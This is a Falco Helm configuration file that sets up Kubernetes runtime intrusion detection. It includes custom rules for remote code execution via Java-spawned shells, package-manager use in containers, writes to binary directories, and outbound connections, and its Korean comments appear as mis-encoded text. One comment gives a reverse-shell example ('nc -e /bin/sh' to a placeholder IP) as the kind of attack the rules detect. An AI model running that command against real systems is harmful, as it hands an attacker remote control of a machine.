# ==============================================================================
# Falco Helm Values
# ==============================================================================
# ì—­í• : ëŸ°íƒ€ì„ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ (IDS - Intrusion Detection System)
# ë“œë¼ì´ë²„: modern-ebpf (kernel module ëŒ€ì‹  ì‚¬ìš©, Cilium ì¶©ëŒ ë°©ì§€)
#
# ì„¤ì¹˜ ëª…ë ¹:
#   helm install falco falcosecurity/falco \
#     -n falco --create-namespace \
#     -f /home/jimin/k8s-manifests/docs/helm/falco/values.yaml
#
# ì—…ê·¸ë ˆì´ë“œ ëª…ë ¹:
#   helm upgrade falco falcosecurity/falco \
#     -n falco \
#     -f /home/jimin/k8s-manifests/docs/helm/falco/values.yaml
#
# ì°¸ê³ : IPS ê¸°ëŠ¥ì€ ë¹„í™œì„±í™” (ìš´ì˜ ê²½í—˜ í›„ ì¶”ê°€ ì˜ˆì •)
# ==============================================================================

# ==============================================================================
# Driver ì„¤ì •
# ==============================================================================
# modern-ebpf: ìµœì‹  eBPF ë“œë¼ì´ë²„ (ê¶Œì¥)
# - kernel module ë¶ˆí•„ìš” (í˜¸ìŠ¤íŠ¸ ì»¤ë„ ìˆ˜ì • ì—†ìŒ)
# - Cilium eBPFì™€ ì¶©ëŒ ì—†ìŒ
# - ì„±ëŠ¥ ìš°ìˆ˜, ë³´ì•ˆì„± ë†’ìŒ
driver:
  kind: modern_ebpf
  # loader:
  #   initContainer:
  #     enabled: false  # modern-ebpfëŠ” loader ë¶ˆí•„ìš”

# ==============================================================================
# Falco ì„¤ì •
# ==============================================================================
falco:
  # JSON ì¶œë ¥ (Falcosidekick, Loki ì—°ë™ìš©)
  json_output: true
  json_include_output_property: true

  # ë¡œê·¸ ë ˆë²¨
  log_level: info

  # ìš°ì„ ìˆœìœ„ í•„í„° (INFO ì´ìƒë§Œ)
  priority: info

  # gRPC ì„œë²„ (Falcosidekick ì—°ë™)
  grpc:
    enabled: true
    bind_address: "unix:///run/falco/falco.sock"
    threadiness: 0

  grpc_output:
    enabled: true

  # HTTP ì¶œë ¥ (Falcosidekickìœ¼ë¡œ ì „ì†¡)
  http_output:
    enabled: true
    url: "http://falco-falcosidekick:2801/"
    # IPS ë¯¸ì‚¬ìš© ì‹œ insecure í—ˆìš©
    insecure: true

# ==============================================================================
# ë¦¬ì†ŒìŠ¤ ì œí•œ
# ==============================================================================
resources:
  requests:
    cpu: 100m
    memory: 256Mi
  limits:
    cpu: 500m
    memory: 512Mi

# ==============================================================================
# Tolerations (ëª¨ë“  ë…¸ë“œì—ì„œ ì‹¤í–‰)
# ==============================================================================
tolerations:
  - key: node-role.kubernetes.io/control-plane
    operator: Exists
    effect: NoSchedule
  - key: node-role.kubernetes.io/master
    operator: Exists
    effect: NoSchedule

# ==============================================================================
# Falcosidekick ì„¤ì • (Alert ì „ì†¡)
# ==============================================================================
# ì—­í• : Falco Alertë¥¼ ë‹¤ì–‘í•œ ëª©ì ì§€ë¡œ ì „ì†¡
# - Slack, Discord, Webhook, Loki ë“±
# - IPS ê¸°ëŠ¥ ë¹„í™œì„±í™” (Response Engine ë¯¸ì‚¬ìš©)
falcosidekick:
  enabled: true

  # ë¦¬ì†ŒìŠ¤ ì œí•œ
  resources:
    requests:
      cpu: 20m
      memory: 64Mi
    limits:
      cpu: 100m
      memory: 128Mi

  # ì›¹ UI (ì„ íƒì )
  webui:
    enabled: true
    replicaCount: 1
    resources:
      requests:
        cpu: 20m
        memory: 64Mi
      limits:
        cpu: 100m
        memory: 128Mi

  config:
    # ==================================================================
    # ì¶œë ¥ ëª©ì ì§€ ì„¤ì •
    # ==================================================================
    # í•„ìš”í•œ ëª©ì ì§€ë§Œ í™œì„±í™” (ë‚˜ë¨¸ì§€ëŠ” ì£¼ì„ ì²˜ë¦¬)

    # Slack ì•Œë¦¼ (ì„ íƒ)
    # slack:
    #   webhookurl: "https://hooks.slack.com/services/XXX/YYY/ZZZ"
    #   minimumpriority: "warning"
    #   outputformat: "all"

    # Discord ì•Œë¦¼ (ì„ íƒ)
    # discord:
    #   webhookurl: "https://discord.com/api/webhooks/XXX/YYY"
    #   minimumpriority: "warning"

    # Loki ì—°ë™ (Grafana ëŒ€ì‹œë³´ë“œ ì—°ë™)
    loki:
      hostport: "http://loki-stack.monitoring.svc.cluster.local:3100"
      minimumpriority: "warning"
      # tenant: ""  # ë©€í‹°í…Œë„Œì‹œ ë¯¸ì‚¬ìš©

    # Webhook (ì»¤ìŠ¤í…€ ì•Œë¦¼)
    # webhook:
    #   address: "http://your-webhook-endpoint"
    #   minimumpriority: "critical"

    # ==================================================================
    # IPS ì„¤ì • (í˜„ì¬ ë¹„í™œì„±í™”)
    # ==================================================================
    # ìš´ì˜ ê²½í—˜ í›„ í™œì„±í™” ì˜ˆì •
    #
    # kubernetes:
    #   kubeconfig: ""  # In-cluster ì‚¬ìš©
    #
    #   # Pod ì¢…ë£Œ (IPS)
    #   # deletepod:
    #   #   enabled: true
    #   #   minimumpriority: "critical"
    #
    #   # NetworkPolicy ìƒì„± (IPS)
    #   # networkpolicy:
    #   #   enabled: true
    #   #   minimumpriority: "critical"

# ==============================================================================
# ì»¤ìŠ¤í…€ ë£° (ì„ íƒ)
# ==============================================================================
# ê¸°ë³¸ ë£° ì™¸ì— ì¶”ê°€ ë£° ì •ì˜
customRules:
  # blog-system namespace íŠ¹í™” ë£°
  blog-rules.yaml: |-
    # ==================================================================
    # Rule 1: Java Process Spawning Shell (RCE ë°©ì–´) - CRITICAL
    # ==================================================================
    # ëª©ì : Spring Boot(Java) í”„ë¡œì„¸ìŠ¤ê°€ shellì„ ì‹¤í–‰í•˜ë©´ RCE ê³µê²© ì˜ì‹¬
    # ì˜ˆì‹œ: Log4Shell, Spring4Shell ê°™ì€ ì·¨ì•½ì  ì•…ìš©
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: Javaê°€ shellì„ ì‹¤í–‰í•  ì´ìœ  ì—†ìŒ (0%)
    - rule: Java Process Spawning Shell
      desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
      condition: >
        spawned_process and
        proc.pname exists and
        proc.pname in (java, javac) and
        proc.name in (bash, sh, ksh, zsh, dash) and
        container
      output: >
        ğŸš¨ CRITICAL: Java í”„ë¡œì„¸ìŠ¤ê°€ Shellì„ ì‹¤í–‰í–ˆìŠµë‹ˆë‹¤ (RCE ê³µê²© ì˜ì‹¬!)
        (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
         parent=%proc.pname cmd=%proc.cmdline container=%container.name)
      priority: CRITICAL
      tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]

    # ==================================================================
    # Rule 2: Package Manager in Container (Immutability ìœ„ë°˜) - WARNING
    # ==================================================================
    # ëª©ì : ìš´ì˜ ì¤‘ ì»¨í…Œì´ë„ˆì—ì„œ íŒ¨í‚¤ì§€ ì„¤ì¹˜ ê°ì§€ (ë¶ˆë³€ì„± ì›ì¹™ ìœ„ë°˜)
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: ë¹Œë“œ ì‹œì—ë§Œ íŒ¨í‚¤ì§€ ì„¤ì¹˜, ëŸ°íƒ€ì„ì—” ì ˆëŒ€ ì•ˆ í•¨
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: í•´ì»¤ê°€ ê³µê²© ë„êµ¬ ì„¤ì¹˜ (netcat, nmap ë“±)
    - rule: Launch Package Management Process in Container
      desc: Package management process ran inside container (Immutability violation)
      condition: >
        spawned_process and
        container and
        proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
        not proc.pname in (package_mgmt_binaries)
      output: >
        âš ï¸ WARNING: ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ íŒ¨í‚¤ì§€ ê´€ë¦¬ìê°€ ì‹¤í–‰ë˜ì—ˆìŠµë‹ˆë‹¤!
        (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
         cmd=%proc.cmdline container=%container.name)
      priority: WARNING
      tags: [maturity_stable, container, process, mitre_execution, T1059]

    # ==================================================================
    # Rule 3: Write to Binary Directory (Drift Detection) - ERROR
    # ==================================================================
    # ëª©ì : ì‹œìŠ¤í…œ ë””ë ‰í† ë¦¬ì— íŒŒì¼ ì“°ê¸° ì‹œë„ ê°ì§€ (ì•…ì„±ì½”ë“œ ì„¤ì¹˜)
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: /bin, /usr/bin, /sbinì€ ì½ê¸° ì „ìš©
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: ë°±ë„ì–´ ë°”ì´ë„ˆë¦¬ ì„¤ì¹˜, rootkit ì„¤ì¹˜
    - rule: Write to Binary Dir
      desc: Attempt to write to system binary directories
      condition: >
        open_write and
        container and
        (fd.name startswith /bin/ or
         fd.name startswith /usr/bin/ or
         fd.name startswith /sbin/ or
         fd.name startswith /usr/sbin/)
      output: >
        ğŸ”´ ERROR: ë°”ì´ë„ˆë¦¬ ë””ë ‰í† ë¦¬ì— ì“°ê¸° ì‹œë„ ê°ì§€!
        (user=%user.name file=%fd.name pod=%k8s.pod.name
         namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
      priority: ERROR
      tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]

    # ==================================================================
    # Rule 4: Unexpected Outbound Connection (Reverse Shell ë°©ì–´) - NOTICE
    # ==================================================================
    # ëª©ì : ì˜ˆìƒì¹˜ ëª»í•œ ì™¸ë¶€ ì—°ê²° ê°ì§€ (C&C ì„œë²„ í†µì‹ , ë°ì´í„° ìœ ì¶œ)
    # ì£¼ì˜: ë…¸ì´ì¦ˆê°€ ë§ì„ ìˆ˜ ìˆìœ¼ë‹ˆ ì´ˆê¸°ì—” NOTICEë¡œ ì„¤ì •, íŠœë‹ í•„ìš”
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: DB(3306), ë‚´ë¶€ API(8080), HTTPS(443) ì—°ê²°
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: í•´ì»¤ C&C ì„œë²„ë¡œ ì—­ì‰˜ ì—°ê²° (nc -e /bin/sh 1.2.3.4 4444)
    - rule: Unexpected Outbound Connection
      desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
      condition: >
        outbound and
        container and
        fd.type in (ipv4, ipv6) and
        not fd.lport in (80, 443, 8080, 3306, 53) and
        not fd.sip in ("127.0.0.1", "::1") and
        not proc.name in (curl, wget, git)
      output: >
        ğŸ”µ NOTICE: ì˜ˆìƒì¹˜ ëª»í•œ ì™¸ë¶€ ì—°ê²° ì‹œë„ ê°ì§€
        (connection=%fd.name lport=%fd.lport rport=%fd.rport
         pod=%k8s.pod.name namespace=%k8s.ns.name
         cmd=%proc.cmdline container=%container.name)
      priority: NOTICE
      tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]

# ==============================================================================
# ìˆ˜ì§‘ê¸° ì„¤ì • (Falco 0.42+)
# ==============================================================================
# ì°¸ê³ : collectors.containerd/docker/crioëŠ” deprecated
# ìƒˆë¡œìš´ ì„¤ì •: collectors.containerEngine (ìë™ ê°ì§€)
collectors:
  # ì»¨í…Œì´ë„ˆ ì—”ì§„ ìë™ ê°ì§€ (ê¶Œì¥)
  # Falcoê°€ ìë™ìœ¼ë¡œ containerd/docker/cri-o ì†Œì¼“ íƒì§€
  containerEngine:
    kind: auto

# ==============================================================================
# ServiceAccount
# ==============================================================================
serviceAccount:
  create: true
  name: falco

# ==============================================================================
# Pod Security
# ==============================================================================
podSecurityContext:
  # FalcoëŠ” syscall ëª¨ë‹ˆí„°ë§ì„ ìœ„í•´ ë†’ì€ ê¶Œí•œ í•„ìš”
  # modern-ebpf ì‚¬ìš© ì‹œì—ë„ ì¼ë¶€ ê¶Œí•œ í•„ìš”
  {}

# ==============================================================================
# ì¶”í›„ IPS í™œì„±í™” ì‹œ ì¶”ê°€í•  ì„¤ì •
# ==============================================================================
# 1. Falcosidekick Response Engine:
#    config:
#      kubernetes:
#        deletepod:
#          enabled: true
#          minimumpriority: "critical"
#
# 2. ë˜ëŠ” Falco Talon (ë³„ë„ ì»´í¬ë„ŒíŠ¸):
#    - Response Engine ì „ìš© ë„êµ¬
#    - ë” ì„¸ë°€í•œ ëŒ€ì‘ ì •ì±… ê°€ëŠ¥
#
# 3. ë˜ëŠ” Kubernetes Admission Controller:
#    - falco-admission-webhook
#    - ë°°í¬ ì‹œì  ì°¨ë‹¨ (Prevention)
